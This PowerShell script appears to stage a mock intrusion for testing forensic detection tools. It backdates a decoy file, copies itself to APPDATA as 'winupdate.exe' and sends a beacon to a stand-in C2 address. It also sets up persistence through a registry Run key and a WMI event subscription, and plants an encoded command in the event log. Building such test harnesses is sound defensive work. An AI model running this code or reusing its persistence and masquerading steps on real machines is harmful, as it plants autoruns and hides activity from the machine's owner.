# ============================================================
#  SkiaHelios Trigger2: Operation "Sun Shadow" 
#  Objective: Validate Chronos, Plutos, AION, and Sphinx
# ============================================================

$ActorPath = "$env:APPDATA\winupdate.exe"
$TargetFile = "$env:USERPROFILE\Documents\Secret_Project.pdf"
$RemoteIP = "8.8.8.8" # 偽のC2サーバー座標

Write-Host "[*] Initiating Operation Sun Shadow..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

# --- Act 1: Chronos Target (Timestomp) ---
Write-Host "[1/4] Act 1: Planting Evidence & Timestomping..." -ForegroundColor Yellow
"This is a highly sensitive project document." | Out-File -FilePath $TargetFile
# $SI時刻だけを物理的に 2024年1月1日 に飛ばすっス！！
(Get-Item $TargetFile).CreationTime = "2024-01-01 09:00:00"
Write-Host " [+] Created: $TargetFile (Backdated to 2024)"
Start-Sleep -Seconds 5

# --- Act 2: Plutos Target (C2 Beacon) ---
Write-Host "[2/4] Act 2: Deploying Actor & Simulating Beacon..." -ForegroundColor Yellow
# 自身（実行中のバイナリ）を擬似的な攻撃体としてコピー
Copy-Item (Get-Process -Id $PID).Path -Destination $ActorPath
Write-Host " [+] Actor Deployed: $ActorPath"

# 低流量(数KB)の通信を発生させ、PlutosのC2検知を試すっス！
Write-Host " [+] Sending 5KB Beacon to $RemoteIP..."
$client = New-Object System.Net.WebClient
try { $client.DownloadString("http://$RemoteIP/check_in?id=001") } catch {}
Start-Sleep -Seconds 5

# --- Act 3: AION Target (Persistence) ---
Write-Host "[3/4] Act 3: Establishing Persistence (WMI & Registry)..." -ForegroundColor Yellow
# 1. Registry Run Key
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SunShadowUpdater" -Value $ActorPath -PropertyType String -Force | Out-Null

# 2. WMI Event Consumer (ファイルレスの震えを刻むっス)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SunShadow_Filter"; EventNamespace = "root\cimv2"; QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 30"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SunShadow_Consumer"; CommandLineTemplate = $ActorPath
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
} | Out-Null
Write-Host " [+] Persistence established via Registry and WMI."
Start-Sleep -Seconds 10

# --- Act 4: Sphinx Target (Obfuscated Command) ---
Write-Host "[4/4] Act 4: Injecting Encoded Commands into Event Log..." -ForegroundColor Yellow
# GUIDを隠れ蓑にした Base64 コマンドっス！！
$MalCode = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami /all; dir C:\Sensitive"))
$EventMsg = "AppID: {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7} payload: $MalCode"

# Windows PowerShell ログ（ID: 4104）をシミュレート
Write-EventLog -LogName "Windows PowerShell" -Source "PowerShell" -EventID 4104 -EntryType Information -Message $EventMsg
Write-Host " [+] Malicious riddle injected into Event Logs."

Write-Host "`n[*] Operation Sun Shadow Completed. 'The trap is set.'" -ForegroundColor Cyan